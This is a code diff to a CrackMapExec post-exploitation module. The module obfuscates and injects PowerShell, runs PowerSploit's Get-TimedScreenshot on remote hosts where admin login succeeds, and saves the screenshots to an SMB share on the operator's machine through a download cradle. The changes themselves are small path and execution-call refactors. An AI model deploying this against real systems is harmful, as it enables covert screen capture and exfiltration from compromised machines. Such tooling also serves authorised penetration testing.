@@ -37,7 +37,7 @@ class CMEModule:
         context.log.info('This module will not exit until CTRL-C is pressed')
         context.log.info('Screenshots will be stored in ~/.cme/logs\n')
 
-        self.ps_script1 = obfs_ps_script('Invoke-PSInject.ps1')
+        self.ps_script1 = obfs_ps_script('cme_powershell_scripts/Invoke-PSInject.ps1')
         self.ps_script2 = obfs_ps_script('powersploit/Exfiltration/Get-TimedScreenshot.ps1')
 
         self.smb_server = CMESMBServer(context.log, self.share_name, context.log_folder_path)
@@ -45,16 +45,15 @@ class CMEModule:
 
     def on_admin_login(self, context, connection):
         screen_folder = 'get_timedscreenshot_{}'.format(connection.host)
-        screen_command = 'Get-TimedScreenshot -Path \\\\{}\\{}\\{} -Interval {} -EndTime {}'.format(context.localip, self.share_name, 
-                                                                                                    screen_folder, self.interval, 
+        screen_command = 'Get-TimedScreenshot -Path \\\\{}\\{}\\{} -Interval {} -EndTime {}'.format(context.localip, self.share_name,
+                                                                                                    screen_folder, self.interval,
                                                                                                     self.endtime)
-        screen_command = gen_ps_iex_cradle(context, 'Get-TimedScreenshot.ps1', 
+        screen_command = gen_ps_iex_cradle(context, 'Get-TimedScreenshot.ps1',
                                            screen_command, post_back=False)
 
         launcher = gen_ps_inject(screen_command, context)
-        ps_command = create_ps_command(launcher)
 
-        connection.execute(ps_command)
+        connection.ps_execute(launcher)
         context.log.success('Executed launcher')
 
     def on_request(self, context, request):
